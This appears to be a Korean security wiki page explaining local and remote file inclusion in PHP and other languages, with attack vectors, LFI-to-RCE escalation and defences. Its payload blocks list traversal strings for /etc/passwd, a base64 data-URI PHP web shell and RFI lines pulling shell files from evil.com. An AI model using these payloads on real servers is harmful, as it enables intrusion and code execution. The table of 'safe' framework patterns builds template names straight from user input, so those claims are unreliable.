---
title: LFI/RFI (Local/Remote File Inclusion) — 핵심 메커니즘
created: 2026-06-13
updated: 2026-06-21
type: concept
tags: [security, lfi, rfi, file-inclusion, path-traversal, php]
sources: [https://owasp.org/www-community/attacks/Path_Traversal, https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Inclusion]
confidence: high
---

# LFI/RFI (Local/Remote File Inclusion) — 핵심 메커니즘

> [[lfi-rfi]]의 공격 원리와 확장 기법을 다루는 분할 페이지입니다.

## 참고 URL
- [owasp.org](https://owasp.org/www-community/attacks/Path_Traversal)
- [owasp.org](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Inclusion)

## Step 3: 전문 용어 설명 (위키백과/OWASP/PortSwigger 기반)
### LFI/RFI (Local/Remote File Inclusion, 로컬/원격 파일 포함)

**정의**: **파일 포함 취약점(File Inclusion Vulnerability)**은 웹 애플리케이션이 **사용자 입력을 검증 없이 파일 포함 함수(include, require, fopen, file_get_contents 등)의 인자로 전달**하여, 공격자가 **임의의 로컬 파일(LFI) 또는 원격 파일(RFI)을 포함시켜 서버에서 코드를 실행하거나 파일을 유출**하게 만드는 취약점이다.

### LFI vs RFI 비교

| 구분 | **LFI (Local File Inclusion)** | **RFI (Remote File Inclusion)** |
|------|-------------------------------|--------------------------------|
| **대상** | **서버 로컬 파일시스템** | **외부 HTTP/HTTPS/FTP/etc URL** |
| **전제 조건** | 파일 포함 함수에 사용자 입력 전달 | `allow_url_include=On` (PHP) + `allow_url_fopen=On` |
| **주요 영향** | **파일 읽기/유출** (소스코드, 설정, 로그, 키) | **원격 코드 실행(RCE)** — 웹쉘 설치, 완전 장악 |
| **난이도** | 낮음 (Path Traversal 결합 흔함) | 중간 (PHP 설정 필요, 최신 PHP 기본 차단) |
| **확장** | Path Traversal(`../`) 결합 필수 | URL 직접 지정, 데이터 URI 스킴도 가능 |

### PHP 설정과 RFI/LFI 가능 여부

| 설정 | 기본값 (PHP 5.6+) | LFI 영향 | RFI 영향 |
|------|------------------|----------|----------|
| `allow_url_fopen` | On | 영향 없음 | **On이어야 RFI 가능** (기본 On) |
| `allow_url_include` | **Off (기본)** | 영향 없음 | **On이어야 RFI 가능** (기본 차단!) |
| `open_basedir` | 설정 시 제한 | **디렉토리 제한으로 LFI 차단 가능** | 동일 |

> **중요**: **PHP 5.2+부터 `allow_url_include=Off` 기본값**으로 RFI는 현대 PHP에서 기본 차단됨. 하지만 구버전/잘못된 설정/타 언어(Java, Node, Python 등)에서는 여전히 위험.

### 주요 공격 벡터 및 페이로드

#### LFI 페이로드 (경로 순회 결합)

```bash
# 기본 Path Traversal
page=../../../etc/passwd
page=..%2f..%2f..%2fetc%2fpasswd  # URL 인코딩
page=..%252f..%252f..%252fetc%252fpasswd  # 이중 인코딩

# NULL 바이트 인젝션 (구버전 PHP)
page=../../../etc/passwd%00

# 래퍼 프로토콜
page=php://filter/convert.base64-encode/resource=/etc/passwd  # Base64 인코딩으로 읽기
page=php://input  # POST 데이터 읽기
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=  # 데이터 URI
page=zip://archive.zip#shell.php  # ZIP 내 파일
page=phar://archive.phar/shell.php  # PHAR 아카이브

# 로그 파일 포함 (로그 인젝션 결합)
page=../logs/access.log  # Apache/Nginx 액세스 로그 (User-Agent에 PHP 코드 주입 후 포함)
page=../logs/error.log
page=/var/log/apache2/access.log
page=/proc/self/environ  # 환경 변수 (HTTP_USER_AGENT 등 주입 가능)
```

#### RFI 페이로드 (원격 코드 실행)

```bash
# 직접 URL
page=http://evil.com/shell.txt
page=http://evil.com/shell.php
page=http://evil.com/shell.txt?cmd=id

# 데이터 URI
page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# FTP/SMB 등 다른 프로토콜
page=ftp://evil.com/shell.txt
page=smb://evil.com/share/shell.php
```

### LFI → RCE 확장 기법 (LFI를 RCE로 승격)

| 기법 | 설명 | 전제 조건 |
|------|------|-----------|
| **로그 파일 인젝션 (Log Poisoning)** | User-Agent 등 로그에 PHP 코드 주입 → 로그 파일 LFI로 실행 | 로그 파일 경로 알려진 경우 + 쓰기 권한 |
| **세션 파일 인젝션** | 세션 파일에 PHP 코드 저장 (`/var/lib/php/sess_...`) → 세션 파일 LFI | 세션 파일 경로 알려진 경우 |
| **업로드 파일 인젝션** | 업로드된 이미지/파일에 PHP 코드 숨김 → 업로드 파일 LFI | 업로드 경로 알려진 경우 + 확장자 우회 |
| **/proc/self/environ** | 환경 변수(HTTP_USER_AGENT 등)에 코드 주입 → environ LFI | `/proc/self/environ` 읽기 권한 |
| **php://filter 체인** | `php://filter/convert.base64-decode/resource=...` 로 인코딩된 페이로드 실행 | base64 인코딩된 페이로드 |
| **PHAR 역직렬화** | `phar://` 래퍼로 PHAR 메타데이터 역직렬화 → 객체 주입 | `phar` 래퍼 지원 + 역직렬화 가젯 |

### 언어/플랫폼별 파일 포함 함수

| 언어/플랫폼 | 포함 함수/메서드 | 기본 동작 |
|------------|-----------------|----------|
| **PHP** | `include`, `require`, `include_once`, `require_once`, `fopen`, `file_get_contents`, `readfile`, `show_source` | **가장 위험** — 래퍼 프로토콜 지원 |
| **JSP/Java** | `<@ include file="..." %>`, `<jsp:include>`, `RequestDispatcher.include()` | `<jsp:include page="${param}">` 위험 |
| **ASP.NET** | `Server.Execute()`, `Response.WriteFile()`, `File.ReadAllText()` | 사용자 입력 경로 사용 시 위험 |
| **Node.js** | `fs.readFile()`, `fs.readFileSync()`, `require()`, `import()` | `require(userInput)` 위험 |
| **Python** | `open()`, `render_template()`, `include` (Jinja2는 샌드박스) | Jinja2 SSTI와 구분 필요 |
| **Go** | `template.ParseFiles()`, `io.Copy()`, `os.Open()` | 템플릿 파싱 시 주의 |
| **Ruby** | `render`, `File.read()`, `require` | `render file: params[:page]` 위험 |

### LFI/RFI 방어 기법

| 방어 계층 | 기법 | 구현 예시 | 효과/비고 |
|----------|------|-----------|-----------|
| **아키텍처 (최우선)** | **사용자 입력을 파일 경로로 직접 사용 금지** | 화이트리스트 매핑: `pages = {'home': 'home.php', 'about': 'about.php'}` → `include(pages[$_GET['page']])` | **가장 확실** — 근본 원인 차단 |
| **PHP 설정 (서버)** | `allow_url_include=Off` (기본) | `php.ini`: `allow_url_include = Off` | RFI 원천 차단 (기본값) |
| | `allow_url_fopen=Off` | `allow_url_fopen = Off` | 원격 래퍼 차단 |
| | `open_basedir` | `open_basedir = /var/www/html:/tmp` | 디렉토리 밖 접근 원천 차단 |
| | `disable_functions` | `disable_functions = exec,system,shell_exec,passthru,proc_open,popen` | RCE 영향 최소화 |
| **입력 검증 (애플리케이션)** | **화이트리스트 검증** | `allowed = {'home','about','contact'}` → `if page not in allowed: 404` | **핵심 방어** |
| | **경로 정규화 후 검증** | `realpath()`, `os.path.normpath()` 후 기저 디렉토리 하위 확인 | Path Traversal 차단 |
| | **확장자/타입 강제** | `.php` 강제 추가, `.php`만 허용 | 확장자 우회 방지 |
| **PHP 설정 (코드 레벨)** | **`include` 대신 화이트리스트 함수** | `function render($page) { allowed=['home','about']; if(!in_array($page,$allowed)) die(); include("pages/$page.php"); }` | 안전한 래퍼 함수 |
| | **자동 이스케이프/검증 미들웨어** | 프레임워크 라우터/컨트롤러에서 파라미터 검증 | 프레임워크 내장 기능 활용 |
| **파일 시스템/OS** | **파일 권한 최소화** | 웹 사용자(`www-data`)가 `/etc/passwd` 등 읽기 불가 | 피해 최소화 (심층 방어) |
| | **웹 루트 밖 저장** | 포함 대상 파일을 DocumentRoot 밖(`/var/app/views/`)에 저장 | 웹 직접 접근 차단 |
| **모니터링/탐지** | **이상 파일 접근 로깅/알림** | `../`, `/etc/passwd`, `http://`, `php://` 패턴 접근 시 알림 | SIEM/WAF 연계 |
| | **웹쉘/악성 파일 스캔** | 정기적 파일 무결성 검사 (AIDE, Tripwire, ClamAV) | 사후 탐지 |

### PHP 설정 권장값 (보안 강화)

```ini
; php.ini 보안 설정 예시
allow_url_fopen = On       ; 필요 시 On, 미필요 시 Off
allow_url_include = Off    ; **필수: RFI 차단**
open_basedir = /var/www/html:/tmp:/var/lib/php/sessions
disable_functions = exec,system,shell_exec,passthru,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,symlink,link,dl,pcntl_exec
expose_php = Off
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

### 언어/프레임워크별 안전한 파일 포함 패턴

| 언어/프레임워크 | 안전한 패턴 |
|--------------|-------------|
| **PHP (Laravel)** | `view('pages.'.$page)` — Blade 템플릿, 자동 이스케이프, 경로 검증 |
| **PHP (Symfony)** | `render('page/'.$page.'.html.twig')` — Twig 템플릿, 샌드박스 |
| **Python (Django)** | `render(request, 'pages/'+page+'.html')` — 템플릿 시스템, 자동 이스케이프 |
| **Python (Flask/Jinja2)** | `render_template(page+'.html')` — `autoescape=True` 기본, 샌드박스 |
| **Node.js (Express)** | `res.render(page)` — 뷰 엔진, 경로 검증 미들웨어 |
| **Java (Spring/Thymeleaf)** | `return "pages/" + page` — Thymeleaf, 안전한 표현식 |
| **ASP.NET Core** | `return View(page)` — Razor 뷰, 경로 검증 |
| **Java (Spring/JSP)** | `<jsp:include page="${page}"/>` → 화이트리스트 검증 후 사용 |



## 관련 위키 링크
- [[lfi-rfi]] — LFI/RFI 메인 페이지
- [[lfi-rfi-defense]] — 방어 및 안전한 구현
- [[path-traversal]] — 경로 순회
- [[rce]] — 원격 코드 실행
